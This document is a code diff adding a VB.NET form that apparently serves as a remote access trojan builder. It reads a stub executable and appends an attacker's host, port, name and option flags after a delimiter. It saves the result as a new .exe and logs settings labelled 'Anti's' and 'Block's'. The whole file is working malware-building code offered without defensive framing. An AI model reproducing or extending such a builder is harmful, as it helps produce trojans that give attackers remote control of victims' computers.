@@ -1,0 +1,68 @@
+﻿Public Class builder
+    Dim stub, text1, text2, text3 As String
+    Const spl As String = "abccba"
+    Dim ex As Exception
+  
+
+    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
+        Me.Close()
+        Form1.Show()
+    End Sub
+
+    Private Sub builder_FormClosed(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosedEventArgs) Handles Me.FormClosed
+        SaveControl()
+    End Sub
+    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles Me.FormClosing
+        SaveControl()
+    End Sub
+    Private Sub SaveControl()
+        My.Settings.Reload()
+        My.Settings.Host = TextBox1.Text
+        My.Settings.Port = TextBox2.Text
+        My.Settings.Name = TextBox3.Text
+        My.Settings.Save()
+    End Sub
+    Private Sub ReloadControl()
+        TextBox1.Text = My.Settings.Host
+        TextBox2.Text = My.Settings.Port
+        TextBox3.Text = My.Settings.Name
+       
+    End Sub
+    Private Sub builder_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
+        ReloadControl()
+    End Sub
+
+    Private Sub CyberButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CyberButton1.Click
+        If TextBox1.Text & TextBox2.Text & TextBox3.Text = "" Then
+            MsgBox("Complete Information", MsgBoxStyle.Critical, "Create Server")
+        Else
+            Dim s As New SaveFileDialog
+            s.ShowDialog()
+            If s.FileName > "" Then
+                text1 = TextBox1.Text
+                text2 = TextBox2.Text
+                text3 = TextBox3.Text
+                FileOpen(1, Application.StartupPath & "\stub.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
+                stub = Space(LOF(1))
+                FileGet(1, stub)
+                FileClose(1)
+                FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
+                FilePut(1, stub & spl & text1 & spl & text2 & spl & text3 & spl & CheckBox1.CheckedState & spl & CheckBox2.CheckedState & spl & CheckBox3.CheckedState & spl & CheckBox4.CheckedState & spl & c5.CheckedState & spl & c6.CheckedState & spl & c7.CheckedState & spl & c8.CheckedState & spl & c9.CheckedState & spl & c10.CheckedState & spl & c11.CheckedState & spl & c12.CheckedState & spl & c13.CheckedState & spl & c14.CheckedState & spl & c15.CheckedState & spl & c16.CheckedState & spl & c20.CheckedState & spl & CyberCheckBox1.CheckedState)
+                FileClose(1)
+                ListBox1.Items.Clear()
+                ListBox1.Items.Add("Host : " & text1)
+                ListBox1.Items.Add("Port : " & text2)
+                ListBox1.Items.Add("Name : " & text3)
+                ListBox1.Items.Add("Anti's : " & c6.CheckedState)
+                ListBox1.Items.Add("Block's : " & CyberCheckBox1.CheckedState)
+                ListBox1.Items.Add("Server Build In : " & s.FileName)
+            Else
+                ListBox1.Items.Add(ex)
+            End If
+        End If
+    End Sub
+
+    Private Sub CheckBox2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox2.Click
+
+    End Sub
+End Class
